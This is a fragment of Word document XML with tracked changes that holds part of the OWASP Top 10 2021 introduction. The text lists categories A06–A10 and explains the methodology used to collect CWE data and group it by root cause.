    <w:p w14:paraId="27F76606" w14:textId="6C2BFD11" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="41" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="42" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- **[A06:2021-Vulnerable and Outdated </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Components](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">A06_2021-Vulnerable_and_Outdated_Components.md)** was previously titled Using Components with Known Vulnerabilities and is #2 in the Top 10 </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">community </w:t>
      </w:r>
      <w:del w:id="43" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00627CCE" w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">- </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="44" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>survey, but also had enough data to make the Top 10 via data analysis. This category moves up from #9 in 2017</w:t>
        </w:r>
        <w:r w:rsidR="00474B8C">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>and is a known issue that we struggle to test and assess risk. It is the only category not to have any Common Vulnerability and Exposures (CVEs) mapped to the included CWEs, so a default exploit and impact weights of 5.0 are factored into their scores.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5911BBA9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="45" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="46" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- **[A07:2021-Identification and Authentication </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Failures](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>A07_2021-Identification_and_Authentication_Failures.md)**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ins>
    </w:p>
    <w:p w14:paraId="1859272D" w14:textId="6E9875C0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="47" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="48" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- **[A08:2021-Software and Data Integrity </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Failures](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>A08_2021-Software_and_Data_Integrity_Failures.md)**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w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>A8:2017-Insecure Deserialization</w:t>
      </w:r>
      <w:del w:id="49" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00627CCE" w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> and </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="50" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**</w:t>
        </w:r>
        <w:r w:rsidR="00474B8C">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>is now a part of this larger category.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2F40A897" w14:textId="4610C8A0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="51" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="52" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- **[A09:2021-Security Logging and Monitoring Failures](A09_2021-Security_Logging_and_Monitoring_Failures.md)** was previously **</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">A10:2017-Insufficient Logging </w:t>
      </w:r>
      <w:del w:id="53" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00627CCE" w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>and</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="54" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>&amp;</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Monitoring</w:t>
      </w:r>
      <w:del w:id="55" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00627CCE" w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>. Two key differentiators</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="56" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>** and is added</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> from </w:t>
      </w:r>
      <w:del w:id="57" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00627CCE" w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">previous OWASP </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="58" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">the </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Top 10 </w:t>
      </w:r>
      <w:del w:id="59" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00627CCE" w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">releases are the substantial </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">community </w:t>
      </w:r>
      <w:ins w:id="60" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>survey (#3), moving up from #10 previously. This category is expanded to include more types of failures, is challenging to test for, and isn't well represented in the CVE/CVSS data. However, failures in this category can directly impact visibility, incident alerting, and forensics.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5E906805" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="61" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="62" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- **[A10:2021-Server-Side Request </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Forgery](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>A10_2021-Server-Side_Request_Forgery_(SSRF).md)**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ins>
    </w:p>
    <w:p w14:paraId="64F36660" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="63" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68AB538E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="64" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="65" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Methodology</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0FB150E5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="66" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="207920A8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="67" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="68" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>This installment of the Top 10 is more data-driven than ever but not blindly data-driven. We selected eight of the ten categories from contributed data and two categories from the Top 10 community survey at a high level. We do this for a fundamental reason, looking at the contributed data is looking into the past. AppSec researchers take time to find new vulnerabilities and new ways to test for them. It takes time to integrate these tests into tools and processes. By the time we can reliably test a weakness at scale, years have likely passed. To balance that view, we use a community survey to ask application security and development experts on the front lines what they see as essential weaknesses that the data may not show yet.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="61E6A119" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="69" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="70" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923158"/>
    </w:p>
    <w:p w14:paraId="67BF34A4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="71" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="72" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">There </w:t>
        </w:r>
      </w:moveTo>
      <w:moveToRangeEnd w:id="70"/>
      <w:ins w:id="73" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>are a few critical changes that we adopted to continue to mature the Top 10.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2D535B62" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="74" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="75" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923159"/>
    </w:p>
    <w:p w14:paraId="71E59657" w14:textId="0CED7A9E" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="76" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="77" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## How </w:t>
        </w:r>
      </w:moveTo>
      <w:moveToRangeEnd w:id="75"/>
      <w:del w:id="78" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00627CCE" w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">feedback and extensive data assembled from dozens of </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="79" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>the categories are structured</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0FC57C59" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="80" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="264015CF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="81" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="82" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>A few categories have changed from the previous installment of the OWASP Top Ten. Here is a high-level summary of the category changes.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="039177E0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="83" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EB07F66" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="84" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="85" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Previous data collection efforts were focused on a prescribed subset of approximately 30 CWEs with a field asking for additional findings. We learned that </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>organizations</w:t>
      </w:r>
      <w:ins w:id="86" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> would primarily focus on just those 30 CWEs and rarely add additional CWEs that they saw. In this iteration, we opened it up and just asked for data, with no restriction on CWEs. We asked for the number of applications tested for a given year (starting in 2017), and the number of applications with at least one instance of a CWE found in testing. This format </w:t>
        </w:r>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>allows us to track how prevalent each CWE is within the population of applications. We ignore frequency for our purposes; while it may be necessary for other situations, it only hides the actual prevalence in the application population. Whether an application has four instances of a CWE or 4,000 instances is not part of the calculation for the Top 10. We went from approximately 30 CWEs to almost 400 CWEs to analyze in the dataset. We plan to do additional data analysis as a supplement in the future. This significant increase in the number of CWEs necessitates changes to how the categories are structured.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="541460A4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="87" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2CCC65B2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="88" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="89" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">We spent several months grouping and categorizing CWEs and could have continued for additional months. We had to stop at some point. There </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>are</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> both *root cause* and *symptom* types of CWEs, where *root cause* types are like "Cryptographic Failure" and "Misconfiguration" contrasted to *symptom* types like "Sensitive Data Exposure" and "Denial of Service." We decided to focus on the *root cause* whenever possible as it's more logical for providing identification and remediation guidance. Focusing on the *root cause* over the *symptom* isn't a new concept; the Top Ten has been a mix of *symptom* and *root cause*. CWEs are also a mix of *symptom* and *root cause*; we are simply being more deliberate about it and calling it out. There is an average of 19.6 CWEs per category in this installment, with the lower bounds at 1 CWE for **[A10:2021-Server-Side Request </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Forgery](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>A10_2021-Server-Side_Request_Forgery_(SSRF).md)** to 40 CWEs in **[A04:2021-Insecure Design](A04_2021-Insecure_Design.md)**. This updated category structure offers additional training benefits as companies can focus on CWEs that make sense for a language/framework.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="386629A4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="90" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="91" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923160"/>
    </w:p>
